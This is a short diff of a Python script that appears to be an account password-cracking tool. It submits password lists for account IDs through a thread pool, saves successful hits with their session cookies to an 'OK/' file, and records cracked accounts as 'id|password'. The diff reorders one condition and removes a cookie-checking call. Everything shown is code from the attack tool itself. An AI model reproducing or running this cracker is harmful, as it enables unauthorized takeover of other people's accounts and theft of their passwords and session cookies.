@@ -1401,8 +1401,8 @@ def passwrd():
 					for xpwd in pwnya:
 						pwv.append(xpwd)
 				else:pass
-				if '' in method:
 					
+				if '' in method:
 					pool.submit(reguler,idf,pwv,awal)
 				else:
 					pool.submit(reguler,idf,pwv,awal)
@@ -1477,8 +1477,8 @@ def reguler(idf,pwv,awal):
 				prints(tree)
 				os.popen('play-audio o.mp3')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
-				cek_apk(kuki)
-				akun.append(idf+'|'+pw+'|'+kuki)
+				
+				akun.append(idf+'|'+pw)
 				break
 			else:continue
 		except requests.exceptions.ConnectionError:time.sleep(31)
